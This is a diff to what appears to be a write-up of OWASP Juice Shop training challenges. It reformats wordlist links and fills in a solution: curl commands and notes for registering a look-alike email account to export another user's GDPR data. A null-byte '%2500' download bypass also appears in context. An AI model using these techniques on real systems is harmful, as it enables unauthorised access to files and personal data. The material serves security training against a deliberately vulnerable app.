@@ -3,9 +3,9 @@
 ## Access Log
 
 Wordlists
-* https://github.com/danielmiessler/SecLists
-* https://github.com/v0re/dirb/tree/master/wordlists
-* https://gitlab.com/kalilinux/packages/dirbuster
+* [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
+* [dirb/wordlists](https://github.com/v0re/dirb/tree/master/wordlists)
+* [kalilinux/dirbuster](https://gitlab.com/kalilinux/packages/dirbuster)
 
 Gain access to any access log file of the server
 
@@ -97,7 +97,15 @@ curl http://juiceshop:3000/ftp/coupons_2013.md.bak%2500.pdf
 Steal someone else's personal data without using Injection
 
 ```bash
-TODO
+# register user qwerty@xyz.com
+curl -sS http://juiceshop:3000/api/Users/ -H 'Content-Type: application/json' --data-raw $'{"email":"qwerty@xyz.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":3,"question":"Mother\'s birth date? (MM/DD/YY)","createdAt":"2023-11-07T08:41:38.130Z","updatedAt":"2023-11-07T08:41:38.130Z"},"securityAnswer":"000000"}' | jq
+
+# login + complete an order
+
+# email format with vowel obfuscated "qw*rty@xyz.c*m"
+# http://juiceshop:3000/rest/track-order/388a-01862722732380de
+
+# reqister new ueser with different vowels e.g. qw[a]rty@xyz.com and export gdpr data
 ```
 
 ## Leaked Access Logs
